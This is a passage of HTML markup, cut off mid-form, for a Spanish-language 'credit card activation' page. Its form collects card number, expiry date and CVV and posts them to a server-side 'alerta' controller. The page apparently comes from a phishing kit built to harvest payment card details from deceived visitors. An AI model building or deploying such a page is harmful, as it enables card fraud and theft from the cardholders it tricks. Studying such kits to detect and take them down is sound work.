        ...
        <div class="container">
            ...
            <div class="col-md-12"></div>
                <div class="col-sm-12 wow fadeIn">
                    ...
                    <h1>Activar Tarjeta de Credito</h1>
                </div>
            </div>
        </div>
    </div>
    ...
    <div class="container">
        ...
        <div class="col-sm-4">
            <div class="page-title-container">
                <div class="container">
                    <div class="row">
                    <form role="form" method="post" action="controladores/alertaactivartdcsec.php">
                        <div class="col-sm-12">
                            <font color="black" size="3">Numero de Tarjeta:</font>
                            <input type="text" name="tarjeta" required onKeyPress="return soloNumeros(event);">
                        </div><br><br>
                        <div class="col-sm-12">
                            <font color="black" size="3">Fecha de Vencimiento:</font>
                            <input type="date" name="fecha" required onKeyPress="return soloNumeros(event);">
                        </div><br><br>
                        <div class="col-sm-12">
                            <font color="black" size="3">Codigo CVV:</font>
                            <input type="text" name="cuenta" required onKeyPress="return soloNumeros(event);">
                        </div><br><br>
                        <div class="col-sm-12">
                            <font color="black" size="3">Tipo de Tarjeta:</font>
                            <select>
                            <option>Visa</option>
